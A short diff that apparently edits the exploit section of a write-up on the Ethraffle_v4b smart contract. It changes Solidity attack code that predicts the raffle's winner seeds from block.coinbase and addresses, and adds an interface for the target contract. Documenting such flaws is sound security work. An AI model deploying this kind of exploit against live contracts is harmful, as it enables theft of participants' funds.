@@ -61,7 +61,7 @@ Exploit
     
         function attack(uint256 _amount) public payable{
         
-            uint current_sold = target.nextTicket;
+            uint current_sold = target.nextTicket();
             if(current_sold + 1 == totalTickets){
                 address seed1 = contestants[uint(block.coinbase) % totalTickets].addr;
                 address seed2 = contestants[uint(this.address) % totalTickets].addr;
@@ -77,4 +77,10 @@ Exploit
             }
             
         }
+    }
+    
+    contract Ethraffle_v4b
+    {
+        function buyTickets() payable public;
+        uint public nextTicket;
     }
